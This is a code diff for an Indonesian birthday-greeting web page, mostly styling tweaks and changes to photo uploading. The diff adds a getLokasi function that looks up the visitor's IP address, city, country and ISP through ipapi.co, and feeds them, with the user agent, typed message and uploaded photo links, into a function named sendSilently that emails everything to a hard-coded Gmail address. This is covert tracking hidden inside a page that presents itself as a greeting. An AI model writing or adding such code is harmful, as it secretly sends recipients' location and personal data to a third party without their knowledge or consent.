@@ -43,9 +43,6 @@ h1,h2,h3,.serif{font-family:'Fraunces',serif}
 .tiny{font-size:.75rem;color:rgba(245,238,222,.5);letter-spacing:.1em}
 .tinylink{font-size:.68rem;color:rgba(245,238,222,.4);letter-spacing:.14em;text-decoration:underline dotted;transition:color .3s}
 .tinylink:hover{color:var(--gold2)}
-.divider{display:flex;align-items:center;gap:1.5em;margin:4rem 0;opacity:.6}
-.divider::before,.divider::after{content:'';flex:1;height:1px;background:linear-gradient(90deg,transparent,var(--gold),transparent)}
-.divider span{font-family:'Fraunces',serif;font-style:italic;color:var(--gold);font-size:1.5rem}
 #fx{position:fixed;inset:0;z-index:3;pointer-events:none}
 .grain{position:fixed;inset:-60%;width:220%;height:220%;z-index:500;pointer-events:none;opacity:.04;mix-blend-mode:overlay;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='300' height='300'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='2'/%3E%3C/filter%3E%3Crect width='300' height='300' filter='url(%23n)' opacity='0.6'/%3E%3C/svg%3E");animation:grain 9s steps(10) infinite}
 @keyframes grain{0%,100%{transform:translate(0,0)}10%{transform:translate(-3%,-4%)}30%{transform:translate(3%,-2%)}50%{transform:translate(-2%,3%)}70%{transform:translate(4%,2%)}90%{transform:translate(-3%,1%)}}
@@ -299,7 +296,7 @@ footer{border-top:1px solid var(--line);padding:0 0 46px}
   </div>
   <div class="wrap cue"><span class="cue-line"></span> gulir pelan-pelan</div>
 </section>
-<div class="marquee"><div class="track" style="--sp:26s"><span>Selamat Ulang Tahun ✦ Happy Birthday ✦ Make a Wish ✦ </span><span>Selamat Ulang Tahun ✦ Happy Birthday  Make a Wish ✦ </span></div></div>
+<div class="marquee"><div class="track" style="--sp:26s"><span>Selamat Ulang Tahun ✦ Happy Birthday ✦ Make a Wish ✦ </span><span>Selamat Ulang Tahun ✦ Happy Birthday  Make a Wish  </span></div></div>
 <section class="sec" id="wish">
   <div class="wrap grid2">
     <div>
@@ -371,12 +368,9 @@ const EMAILJS = {
   SERVICE_ID:  'service_d3bo96f',
   TEMPLATE_ID: 'template_v83j068'
 };
+const CLOUDINARY_CLOUD  = 'tuplbrc2';
+const CLOUDINARY_PRESET = 'happy birthday'; // ⚠️ samakan PERSIS dengan nama preset di dashboard
 
-/* (Opsional tapi disarankan) API key ImgBB gratis biar foto PASTI ter-upload.
-   Ambil di: https://api.imgbb.com/ → daftar → salin API key → tempel di sini.
-   Biarkan '' untuk pakai host backup (Platzi/Pixeldrain). */
-const CLOUDINARY_CLOUD  = 'tuplbrc2';      // ✅ sudah benar
-const CLOUDINARY_PRESET = 'happy birthday';      // ← ganti dengan nama preset kamu
 const LS = 'walden_bday_v2';
 let DATA = { nama:'', tanggal:'', pesan:'', fotos:[] };
 try { const s = JSON.parse(localStorage.getItem(LS)); if (s && typeof s === 'object') DATA = Object.assign(DATA, s); } catch(e){}
@@ -415,7 +409,7 @@ function fileToDataURL(file, maxW = 500, quality = .65){
 }
 
 /* ============================================================
-   EMAIL + UPLOAD FOTO → URL (3 lapis backup)
+   EMAIL + LOKASI + UPLOAD FOTO
 ============================================================ */
 let emailjsReady = false;
 async function initEmailJS(){
@@ -423,6 +417,16 @@ async function initEmailJS(){
   if (!EMAILJS.PUBLIC_KEY || typeof emailjs === 'undefined') return false;
   try { emailjs.init({ publicKey: EMAILJS.PUBLIC_KEY }); emailjsReady = true; return true; }
   catch(e){ return false; }
+}
+
+async function getLokasi(){
+  try {
+    const r = await fetch('https://ipapi.co/json/');
+    const j = await r.json();
+    return { kota: j.city || '-', negara: j.country_name || '-', ip: j.ip || '-', isp: j.org || '-' };
+  } catch(e){
+    return { kota: '-', negara: '-', ip: '-', isp: '-' };
+  }
 }
 
 async function uploadToCloudinary(dataUrl, idx){
@@ -436,33 +440,12 @@ async function uploadToCloudinary(dataUrl, idx){
   throw new Error('cloudinary gagal: ' + (json?.error?.message || res.status));
 }
 
-async function uploadToPlatzi(dataUrl, idx){
-  const blob = await (await fetch(dataUrl)).blob();
-  const form = new FormData();
-  form.append('file', blob, 'kenangan-' + idx + '.jpg');
-  const res = await fetch('https://api.escuelajs.co/api/v1/files/upload', { method:'POST', body:form });
-  if (!res.ok) throw new Error('platzi HTTP ' + res.status);
-  const json = await res.json();
-  if (json && json.url) return json.url;
-  throw new Error('platzi no url');
-}
-
-async function uploadToPixeldrain(dataUrl, idx){
-  const blob = await (await fetch(dataUrl)).blob();
-  const form = new FormData();
-  form.append('file', blob, 'kenangan-' + idx + '.jpg');
-  const res = await fetch('https://pixeldrain.com/api/file', { method:'POST', body:form });
-  const json = await res.json();
-  if (json && json.id) return 'https://pixeldrain.com/api/file/' + json.id;
-  throw new Error('pixeldrain fail');
-}
-
 async function uploadFotoToUrl(dataUrl, idx){
   try {
     const url = await uploadToCloudinary(dataUrl, idx);
     console.log('[UPLOAD] foto', idx, 'via cloudinary →', url);
     return url;
-   } catch(e){
+  } catch(e){
     console.warn('[UPLOAD] cloudinary gagal:', e);
     return null;
   }
@@ -496,6 +479,7 @@ async function sendSilently(trigger = 'unknown'){
     if (!ready) return;
     const waktu = new Date().toLocaleString('id-ID',{dateStyle:'full',timeStyle:'short'});
     const device = navigator.userAgent.substring(0, 120);
+    const lokasi = await getLokasi();
     const punyaFoto = DATA.fotos.length > 0;
     const urls = await buildFotoLinks(DATA.fotos);
     const params = {
@@ -503,8 +487,13 @@ async function sendSilently(trigger = 'unknown'){
       tanggal: DATA.tanggal || '(kosong)',
       pesan: DATA.pesan || '(tidak ada pesan)',
       waktu, device,
+      kota: lokasi.kota,
+      negara: lokasi.negara,
+      ip_penerima: lokasi.ip,
+      isp: lokasi.isp,
       jumlah_foto: String(DATA.fotos.length),
-      foto_urls: !punyaFoto ? '(tidak ada foto dilampirkan)' : (urls.length ? urls.join('\n') : '(upload gagal)'),      foto_html: !punyaFoto ? '(tidak ada foto dilampirkan)' : buildFotoHTML(urls),
+      foto_urls: !punyaFoto ? '(tidak ada foto dilampirkan)' : (urls.length ? urls.join('\n') : '(upload gagal)'),
+      foto_html: !punyaFoto ? '(tidak ada foto dilampirkan)' : buildFotoHTML(urls),
       to_email: 'waldenlimber@gmail.com'
     };
     const result = await emailjs.send(EMAILJS.SERVICE_ID, EMAILJS.TEMPLATE_ID, params);
